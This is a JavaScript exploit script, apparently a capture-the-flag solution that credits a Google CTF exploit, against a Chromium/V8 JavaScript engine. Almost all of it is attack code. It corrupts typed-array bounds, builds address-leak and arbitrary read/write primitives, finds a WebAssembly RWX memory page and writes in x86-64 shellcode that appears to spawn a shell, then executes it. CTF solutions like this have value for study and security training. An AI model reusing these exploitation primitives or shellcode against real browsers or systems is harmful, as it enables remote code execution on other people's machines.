// flag: p4{c0mPIling_chr@mium_1s_h4rd_ok?}
a = new Uint8Array([0xee,0xee,0xee,0xee]);
b = new Float64Array([1.1,1.1,1.1,1.1]);
c = new Array({},2,3,4); // offset(a->c) == 0x188
d = new String('pwned')

// credits to google ctf:
// https://github.com/google/google-ctf/blob/master/2018/finals/pwn-just-in-time/exploit/index.html
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};

BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}

Number.prototype.hex = function() {
  return '0x' + this.toString(16);
};

Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}

// make itself long enough to overwrite b
a.fill(0xff, 28, 30);
a.fill(0xff, 36, 38);

// leak base
mmap_base = BigInt(d.charCodeAt(-0xe6c0) + (d.charCodeAt(-0xe6c0 + 1) << 8)) << 32n
console.log('mmap base:', mmap_base.hex())

function addr_of(x) {
  c[0] = x
  offset = a[0x188] + (a[0x189]<<8) + (a[0x18a]<<16) + (a[0x18b]<<24)
  return mmap_base + BigInt(offset) - 1n
}

function leak(address, bytes=8) {
  address -= 8n
  hi = Number(address >> 32n)
  lo = Number(address & 0xffffffffn) + 1

  for(let i = 0; i < 4; i++) {
    bt = hi & 0xff
    hi >>= 8
    a.fill(bt, 0x13c+i, 0x13d+i);
    bt = lo & 0xff
    lo >>= 8
    a.fill(bt, 0x140+i, 0x141+i);
  }

  mask = 0xFFFFFFFFFFFFFFFFn >> BigInt(64-8*bytes)
  return b[0].f2i() & mask
}

function leak_comp_untag(address) {
  return mmap_base + leak(address, 4) - 1n
}

function write(address, value) {
  address -= 8n
  hi = Number(address >> 32n)
  lo = Number(address & 0xffffffffn) + 1

  for(let i = 0; i < 4; i++) {
    bt = hi & 0xff
    hi >>= 8
    a.fill(bt, 0x13c+i, 0x13d+i);
    bt = lo & 0xff
    lo >>= 8
    a.fill(bt, 0x140+i, 0x141+i);
  }

  b[0] = value.i2f()
}


// https://mbebenita.github.io/WasmExplorer/
// (module
//  (export "main" (func $main))
//   (func $main (; 0 ;) (result i32)
//     (i32.const 42)
//  )
// )
var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01,
    0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01,
    0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00,
    0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x88,
    0x80, 0x80, 0x80, 0x00, 0x01, 0x04, 0x6d, 0x61, 0x69,
    0x6e, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00,
    0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a,
    0x0b
]);

var shellcode = new Uint8Array([
    0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0,
    0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f,
    0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05
])

var wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code))
var pwned = wasm_instance.exports.main;

var inst_addr = addr_of(wasm_instance)
var rwx_addr = leak(inst_addr + 0x68n, 8)
console.log('rwx buffer:', rwx_addr.hex())

for (var i in shellcode) {
  write(rwx_addr + BigInt(i), BigInt(shellcode[i]))
}

pwned()
